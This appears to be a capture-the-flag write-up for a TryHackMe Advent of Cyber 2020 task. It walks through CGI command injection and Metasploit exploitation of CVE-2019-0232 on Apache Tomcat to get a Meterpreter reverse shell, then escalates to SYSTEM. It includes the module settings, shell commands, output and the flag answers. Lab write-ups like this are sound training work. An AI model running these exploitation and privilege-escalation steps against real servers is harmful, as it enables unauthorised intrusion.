# Day 12 - Ready, set, elf

**Date:** 12, December, 2020

**Author:** Dhilip Sanjay S

---

## Learning Objectives
- [Common Gateway Interface (or) CGI](https://www.tcl.tk/man/aolserver3.0/cgi-ch1.htm)
    - Standard means of communicating and processing data between a client such as a web browser to a web server.
    - CGI Scripts are stored in `/cgi-bin/` folder. 
        - **Example:**`systeminfo.sh` shows the date and time.
    - By adding `?&<command>` to the URL, you can check whether your command is executed and you get the output.
        - For Linux- `ls`
        - For Windows - `systeminfo`
    - **Note:** Special characters will be [URL Encoded](https://www.techopedia.com/definition/10346/url-encoding)

- [Metasploit](https://www.metasploit.com/)
---

## Solutions
### 1) What is the version number of the web server?
- **Answer:** 9.0.17
- **Steps to Reproduce:** Use `nmap` or visit `<MACHINE_IP>:8080` on browser
---

### What CVE can be used to create a Meterpreter entry onto the machine?
- **Answer:** CVE-2019-0232 (Apache Tomcat - CGIServlet enableCmdLineArguments Remote Code Execution (Metasploit))
- **Steps to Reproduce:** 
    - Use `msfconsole` (Metasploit) or [Exploit-DB](https://www.exploit-db.com/)
    - Search `Apache Tomcat 9.0` - For Windows

---

### What are the contents of flag1.txt
- **Answer:** thm{whacking_all_the_elves}
- **Steps to Reproduce:** 
    - msf6>`search apache tomcat 9.0`
        ```bash        
        Matching Modules
        ================

        #  Name                                         Disclosure Date  Rank       Check  Description
        -  ----                                         ---------------  ----       -----  -----------
        0  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
        ```
        
    - msf6>`use 0`
    - `set LHOST <Your_TryHackMe_IP>`
    - `set RHOSTS <MACHINE_IP>`
    - `set TARGETURI /cgi-bin/elfwhacker.bat`
    - Verify the settings by typing `options`
    - Type `run`. You'll get the Meterpreter shell.
    - meterpreter>`shell`
    - Now you'll get a shell on the Target machine
    - To view the flag - `type flag1.txt`

### Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!
- **Privilege Escalation:**
    - [Offensive Security Article](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/)
    - [Null Byte Article](https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/)

    ### 1. Using `getsystem` command
    - **Before Escalation:**
        ```powershell
        meterpreter > getuid
        Server username: TBFC-WEB-01\elfmcskidy    
        ```
    - **Escalation:**
        ```powershell
        meterpreter> use priv
        Loading extension priv...success.

        meterpreter> getsystem
        ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
        ```
    
    - **Post Esclation:**
        ```powershell
        meterpreter> getuid
        Server username: NT AUTHORITY\SYSTEM
        ```

    ### 2. Using Local Exploits 
    - If `getsystem` fails:
        ```powershell
        meterpreter > getsystem
        [-] priv_elevate_getsystem: Operation failed: Access is denied.        
        ```

    - Run the command:
     ```powershell
     meterpreter> run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true
        [+] 10.10.xxx.xxx - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
        [+] 10.10.xxx.xxx - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
        [+] 10.10.xxx.xxx - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
        [+] 10.10.xxx.xxx - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.    
    ```
    - Only `exploit/windows/local/ms16_075_reflection` is used for privilege escalation.
    - Move the current meterpreter to background.
    - Set the options along with `session` and then run the above mentioned exploit using the command `exploit`.
    - Now you will get the shell with admin access.
    ```powershell
        meterpreter> getuid
        Server username: NT AUTHORITY\SYSTEM
    ```

---

[Back to Advent of Cyber 2](/TryHackMe/Advent%20of%20Cyber%202) 
